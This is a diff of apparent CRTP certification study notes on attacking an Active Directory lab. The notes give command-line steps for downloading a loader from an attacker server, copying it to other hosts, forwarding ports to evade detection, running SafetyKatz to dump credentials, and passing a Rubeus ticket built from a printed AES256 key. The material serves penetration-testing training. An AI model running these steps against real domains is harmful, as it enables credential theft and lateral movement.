@@ -1638,7 +1638,7 @@ SharpHound.exe --stealth
 ```
 
 
-
+# Learing Objective 7
 # Abusing Admin Sessions then extract the credentials using SafetyKatz
 ### Using access to dcorp-ci
 1. open a new cmd and bypass Enhanced Script Block Logging
@@ -1675,6 +1675,7 @@ iwr http://10.0.2.10:9002/Loader.exe -OutFile C:\Users\machine2\Downloads\Loader
 echo F | xcopy C:\Users\machine2\Downloads\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2b8169a9-e104-4231-a05d-622d99c55c2a)
+
 8. Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt. it will detect because we are downloading and executing an exe file webserver
 ```
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1"
@@ -1693,11 +1694,13 @@ $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:80
 >C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 12. a new cmd will be opened using svcadmin privilege, however if you try `whoami` it will show student1. to use svcadmin on dcorp-mgmt you need to use `winrs`
+
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e9772e3b-edda-467d-83a5-382d7b219757)
 
 ### Using derivative local admin
 derivative means if student1 has access to adminsrv machine; adminsrv has access to mgmt machine; means student1 has access to mgmt
 1. check if you have a local admin access on adminsrv machine
+   
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/09723692-ffd9-4936-9576-02ee2356e5a5)
 
 2. access adminsrv
@@ -1710,6 +1713,7 @@ Enter-PSSession -ComputerName dcorp-adminsrv
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/443bb981-776c-4a17-836f-7b85e6b1bef9)
 
 you will get an error
+
 4. check your current language mode
 ```
 $ExecutionContext.SessionState.LanguageMode
@@ -1761,10 +1765,11 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::
 14. you will get the credentials 
 
 
+
 # Runas
 if you found AD credentials but nowhere to log in with them. Runas allows a user to run a specific program with a different account
 ```
-runas.exe /netonly /user:<domain>\<username> cmd.exe
+runas.exe -u <username> -p <password> -e <executable> [-d <domain>]
 ```
 
 # Lateral Movement - PowerShell Remoting
@@ -1864,19 +1869,6 @@ AssemblyLoad.exe
 http://10.10.16.10/Loader.exe -path http://10.10.16.11/SafetyKatz.exe
 ```
 
-# Learing Objective 7
-### Find domain Admin session in a different machine
-```
-Find-DomainUserLocation
-```
-### Verify the session
-```
-winrs -r:<ComputerName> set computername;set username
-```
-copy executable file to another machine
-```
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
-```
 
 # Persistence - Golden Ticket
 ### Methodology/Steps
